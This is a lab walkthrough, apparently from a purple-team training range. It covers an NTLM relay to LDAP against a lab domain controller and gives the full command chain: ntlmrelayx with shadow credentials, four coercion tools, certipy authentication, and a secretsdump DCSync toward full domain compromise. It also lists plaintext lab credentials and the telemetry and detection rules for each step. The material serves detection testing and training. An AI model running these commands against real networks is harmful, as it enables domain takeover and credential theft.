# WT#021 — NTLM Relay to LDAP

## Metadata
| Field | Value |
|-------|-------|
| **Target VM** | 192.168.77.10 (dc01.cadre.local) |
| **Domain** | cadre.local |
| **Starting Credential** | analyst_dfir / An@lyst_DF1R! |
| **Tools Required** | impacket-ntlmrelayx, coercer / PetitPotam / dfscoerce / dementor.py |
| **Certifications** | CRTE, CAPE |
| **MITRE ATT&CK** | T1557.001 |
| **Difficulty** | Medium |

## Prerequisites
- LDAP signing NOT enforced on dc01 (CADRE default — signing not required)
- SMB signing NOT enforced on Kali (default for Linux)
- Ability to coerce NTLM authentication from dc01$ (use WT#017, WT#018, WT#019, or WT#020)
- `ops_redcell` user exists in cadre.local (R3dC3ll_0ps!)
- Network connectivity from Kali (192.168.77.41) to dc01 (192.168.77.10)

## Attack Steps

### Step 1: Start ntlmrelayx with Shadow Credentials targeting LDAP
```bash
impacket-ntlmrelayx -t ldap://dc01.cadre.local --shadow-credentials --escalate-user ops_redcell -smb2support
```

### Step 2: Coerce NTLM authentication from dc01$
In a separate terminal, run any coercion technique:

```bash
# Option A — PrinterBug (WT#017):
python3 dementor.py 192.168.77.41 dc01.cadre.local -d cadre.local -u analyst_dfir -p An@lyst_DF1R!

# Option B — PetitPotam (WT#018):
python3 PetitPotam.py 192.168.77.41 dc01.cadre.local

# Option C — DFSCoerce (WT#019):
python3 dfscoerce.py -d cadre.local -u analyst_dfir -p An@lyst_DF1R! 192.168.77.41 dc01.cadre.local

# Option D — ShadowCoerce (WT#020):
python3 ShadowCoerce.py 192.168.77.41 dc01.cadre.local
```

### Step 3: Verify Shadow Credentials were written
If successful, ntlmrelayx output shows:
```
[*] Servers started, waiting for connections
[*] SMBD-Thread-9: Connection from dc01$@CADRE.LOCAL ...
[*] Target system: dc01.cadre.local
[*] Generating shadow credentials for user: dc01$
[*] Shadow credentials added to dc01$ successfully
[*] Copying certificate to: dc01$_shadow.pfx
```

### Step 4: Authenticate with Shadow Credentials
```bash
# Use the PFX with certipy to get a TGT for dc01$:
certipy auth -pfx dc01$_shadow.pfx -dc-ip 192.168.77.10 -username dc01$ -domain cadre.local
```

### Step 5: DCSync using dc01$ TGT
```bash
# Use the obtained TGT to extract all hashes:
impacket-secretsdump -k cadre.local/dc01$@dc01.cadre.local
```

## Post-Exploitation Chain
- Shadow Credentials on dc01$ → TGT for DC computer → DCSync → KRBTGT hash → Golden Ticket (WT#010) → Full domain compromise
- Can also use RBCD instead of Shadow Credentials: `--delegate-access` flag

## Telemetry Verification
| Source | What to look for |
|--------|-----------------|
| **Windows Security (dc01)** | Event 5136 (msDS-KeyCredentialLink modified), Event 4662 (LDAP write), Event 4781 (shadow cred write) |
| **Sysmon (dc01)** | Event 1 (ntlmrelayx traffic on dc01), Event 3 (LDAP connection from Kali) |
| **Zeek (monitor)** | `dce_rpc.log` (coercion RPC), `smb_files.log` (SMB capture), `kerberos.log` (later auth steps) |
| **Suricata (monitor)** | NTLM relay traffic, LDAP modification alerts |
| **Elastic / Kibana** | `logs-system.security-*`, `logs-windows.sysmon_operational-*`, `logs-zeek.*-*` |
| **Detection rule** | `cadre-006-ntlm-relay` threshold alert |

## Status
**CONFIGURED** — LDAP signing not required on dc01. All coercion primitives available on Kali.
